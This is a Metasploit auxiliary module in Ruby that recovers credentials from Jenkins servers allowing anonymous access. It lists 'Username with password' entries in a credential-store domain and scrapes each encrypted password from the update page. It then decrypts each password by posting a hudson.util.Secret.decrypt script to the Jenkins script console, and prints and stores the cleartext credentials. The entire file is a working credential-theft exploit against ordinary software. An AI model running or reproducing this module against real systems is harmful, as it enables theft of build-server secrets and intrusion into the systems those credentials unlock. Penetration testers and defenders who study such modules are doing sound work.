##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'json'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Jenkins Domain Credential Recovery',
      'Description'    => %q{
        This module will collect Jenkins domain credentials, and uses
        the script console to decrypt each password if anonymous permission
        is allowed.

        It has been tested against Jenkins version 1.590, 1.633, and 1.638.
      },
      'Author'         =>
        [
          'Th3R3p0', # Vuln Discovery, PoC
          'sinn3r'   # Metasploit
        ],
      'References'     =>
        [
          [ 'EDB', '38664' ],
          [ 'URL', 'http://www.th3r3p0.com/vulns/jenkins/jenkinsVuln.html' ]
        ],
      'DefaultOptions' =>
        {
          'RPORT' => 8080
        },
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        OptString.new('TARGETURI',     [true, 'The base path for Jenkins', '/']),
        OptString.new('JENKINSDOMAIN', [true, 'The domain where we want to extract credentials from', '_'])
      ])
  end


  # Returns the Jenkins version.
  #
  # @return [String] Jenkins version.
  # @return [NilClass] No Jenkins version found.
  def get_jenkins_version
    uri = normalize_uri(target_uri.path)
    res = send_request_cgi({ 'uri' => uri })

    unless res
      fail_with(Failure::Unknown, 'Connection timed out while finding the Jenkins version')
    end

    html = res.get_html_document
    version_attribute = html.at('body').attributes['data-version']
    version = version_attribute ? version_attribute.value : ''
    version.scan(/jenkins\-([\d\.]+)/).flatten.first
  end


  # Returns the Jenkins domain configured by the user.
  #
  # @return [String]
  def domain
    datastore['JENKINSDOMAIN']
  end


  # Returns a check code indicating the vulnerable status.
  #
  # @return [Array] Check code
  def check
    version = get_jenkins_version
    vprint_status("Found version: #{version}")

    # Default version is vulnerable, but can be mitigated by refusing anonymous permission on
    # decryption API. So a version wouldn't be adequate to check.
    if version
      return Exploit::CheckCode::Detected
    end

    Exploit::CheckCode::Safe
  end


  # Returns all the found Jenkins accounts of a specific domain. The accounts collected only
  # include the ones with the username-and-password kind. It does not include other kinds such
  # as SSH, certificates, or other plugins.
  #
  # @return [Array<Hash>] An array of account data such as id, username, kind, description, and
  #                       the domain it belongs to.
  def get_users
    users = []

    uri = normalize_uri(target_uri.path, 'credential-store', 'domain', domain)
    uri << '/'

    res = send_request_cgi({ 'uri'=>uri })

    unless res
      fail_with(Failure::Unknown, 'Connection timed out while enumerating accounts.')
    end

    html = res.get_html_document
    rows = html.search('//table[@class="sortable pane bigtable"]//tr')

    # The first row is the table header, which we don't want.
    rows.shift

    rows.each do |row|
      td = row.search('td')
      id = td[0].at('a').attributes['href'].value.scan(/^credential\/(.+)/).flatten.first || ''
      name = td[1].text.scan(/^(.+)\/\*+/).flatten.first || ''
      kind = td[2].text
      desc = td[3].text
      next unless /Username with password/i === kind

      users << {
        id:          id,
        username:    name,
        kind:        kind,
        description: desc,
        domain:      domain
      }
    end

    users
  end


  # Returns the found encrypted password from the update page.
  #
  # @param id [String] The ID of a specific account.
  #
  # @return [String] Found encrypted password.
  # @return [NilCass] No encrypted password found.
  def get_encrypted_password(id)
    uri = normalize_uri(target_uri.path, 'credential-store', 'domain', domain, 'credential', id, 'update')
    res = send_request_cgi({ 'uri'=>uri })

    unless res
      fail_with(Failure::Unknown, 'Connection timed out while getting the encrypted password')
    end

    html = res.get_html_document
    input = html.at('//div[@id="main-panel"]//form//table//tr/td//input[@name="_.password"]')

    if input
      return input.attributes['value'].value
    else
      vprint_error("Unable to find encrypted password for #{id}")
    end

    nil
  end


  # Returns the decrypted password by using the script console.
  #
  # @param encrypted_pass [String] The encrypted password.
  #
  # @return [String] The decrypted password.
  # @return [NilClass] No decrypted password found (no result found on the console)
  def decrypt(encrypted_pass)
    uri  = normalize_uri(target_uri, 'script')
    res  = send_request_cgi({
      'method'    => 'POST',
      'uri'       => uri,
      'vars_post' => {
        'script' => "hudson.util.Secret.decrypt '#{encrypted_pass}'",
        'json'   => {'script' => "hudson.util.Secret.decrypt '#{encrypted_pass}'"}.to_json,
        'Submit' => 'Run'
      }
    })

    unless res
      fail_with(Failure::Unknown, 'Connection timed out while accessing the script console')
    end

    if /javax\.servlet\.ServletException: hudson\.security\.AccessDeniedException2/ === res.body
      vprint_error('No permission to decrypt password')
      return nil
    end

    html = res.get_html_document
    result = html.at('//div[@id="main-panel"]//pre[contains(text(), "Result:")]')
    if result
      decrypted_password = result.inner_text.scan(/^Result: ([[:print:]]+)/).flatten.first
      return decrypted_password
    else
      vprint_error('Unable to find result')
    end

    nil
  end


  # Decrypts an encrypted password for a given ID.
  #
  # @param id [String] Account ID.
  #
  # @return [String] The decrypted password.
  # @return [NilClass] No decrypted password found (no result found on the console)
  def descrypt_password(id)
    encrypted_pass = get_encrypted_password(id)
    decrypt(encrypted_pass)
  end


  # Reports the username and password to database.
  #
  # @param opts [Hash]
  # @option opts [String] :user
  # @option opts [String] :password
  # @option opts [String] :proof
  #
  # @return [void]
  def report_cred(opts)
    service_data = {
      address: rhost,
      port: rport,
      service_name: ssl ? 'https' : 'http',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user]
    }.merge(service_data)

    if opts[:password]
      credential_data.merge!(
        private_data: opts[:password],
        private_type: :password
      )
    end

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end


  def run
    users = get_users
    print_status("Found users for domain #{domain}: #{users.length}")

    users.each do |user_data|
      pass = descrypt_password(user_data[:id])
      if pass
        if user_data[:description].blank?
          print_good("Found credential: #{user_data[:username]}:#{pass}")
        else
          print_good("Found credential: #{user_data[:username]}:#{pass} (#{user_data[:description]})")
        end
      else
        print_status("Found #{user_data[:username]}, but unable to decrypt password.")
      end

      report_cred(
        user: user_data[:username],
        password: pass,
        proof: user_data.inspect
      )
    end
  end


  def print_status(msg='')
    super("#{peer} - #{msg}")
  end


  def print_good(msg='')
    super("#{peer} - #{msg}")
  end


  def print_error(msg='')
    super("#{peer} - #{msg}")
  end
end
